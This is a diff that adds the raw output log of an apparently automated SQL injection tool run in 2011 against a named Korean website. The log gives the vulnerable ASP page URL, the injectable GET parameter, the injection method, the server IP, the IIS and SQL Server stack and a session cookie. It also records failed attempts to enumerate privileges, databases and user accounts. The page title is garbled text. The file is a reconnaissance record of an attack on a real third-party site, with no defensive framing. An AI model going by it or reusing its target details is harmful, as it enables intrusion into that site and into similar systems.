@@ -1,0 +1,37 @@
+■漏洞信息:============================================================
+ ·URL:http://www.daekwang1925.pe.kr/holyhouse/holyhompy/bd_vt/vtList.asp?subst=visitor&Biz=daekwang1925&id=93jsk
+ ·页面标题：傈浇扁瘤眉狼 扁档规.
+ ·参数:subst=visitor&Biz=daekwang1925&id=93jsk
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:66.232.146.164
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Server: Microsoft-IIS/5.0
+Date: Mon, 04 Apr 2011 07:19:53 GMT
+Connection: Keep-Alive
+Content-Length: 6805
+Content-Type: text/html
+Expires: Mon, 04 Apr 2011 07:19:53 GMT
+Set-Cookie: ASPSESSIONIDCSARCBBD=IEHMGMJBMLNGGAACBDAEHNKA; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前用户权限：
+获取用户权限失败！
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
